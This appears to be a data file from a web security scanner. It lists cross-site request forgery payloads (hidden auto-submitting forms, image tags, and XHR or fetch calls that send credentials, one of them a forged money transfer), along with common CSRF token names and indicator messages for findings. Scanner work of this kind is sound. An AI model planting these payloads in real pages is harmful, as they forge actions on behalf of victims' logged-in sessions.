# Common CSRF attack vectors
CSRF_ATTACK_VECTORS = [
    # Image-based CSRF
    '<img src="http://vulnerable.com/action?param=value">',
    '<img src="http://vulnerable.com/transfer?amount=1000&to=attacker">',
    
    # Form-based CSRF
    '<form action="http://vulnerable.com/action" method="POST" style="display:none;">'
    '<input type="hidden" name="param" value="malicious">'
    '<script>document.forms[0].submit();</script>'
    '</form>',
    
    # XMLHttpRequest CSRF
    '<script>'
    'var xhr = new XMLHttpRequest();'
    'xhr.open("POST", "http://vulnerable.com/action", true);'
    'xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");'
    'xhr.send("param=malicious");'
    '</script>',
    
    # Fetch API CSRF
    '<script>'
    'fetch("http://vulnerable.com/action", {'
    'method: "POST",'
    'credentials: "include",'
    'body: "param=malicious"'
    '});'
    '</script>',
    
    # JSON-based CSRF
    '<script>'
    'fetch("http://vulnerable.com/api/action", {'
    'method: "POST",'
    'headers: {"Content-Type": "application/json"},'
    'credentials: "include",'
    'body: JSON.stringify({param: "malicious"})'
    '});'
    '</script>'
]

# Common CSRF token names and patterns
CSRF_TOKEN_NAMES = [
    'csrf_token',
    'csrftoken',
    '_csrf',
    '_token',
    'authenticity_token',
    'csrf',
    'token',
    '__requestverificationtoken',
    '_RequestVerificationToken',
    'anticsrf',
    'csrf_nonce',
    'nonce',
    '_gat',
    'request_token',
]

# CSRF vulnerability indicators
CSRF_INDICATORS = {
    "missing_token": "Form missing CSRF token",
    "weak_token": "CSRF token appears weak or predictable",
    "no_samesite": "Missing SameSite cookie attribute",
    "post_over_http": "Form submits over unencrypted HTTP",
    "no_referer_check": "No HTTP Referer validation",
    "samesite_none": "SameSite=None without Secure flag",
    "no_double_submit": "No double-submit cookie pattern",
    "predictable_token": "CSRF token is sequential or predictable",
}
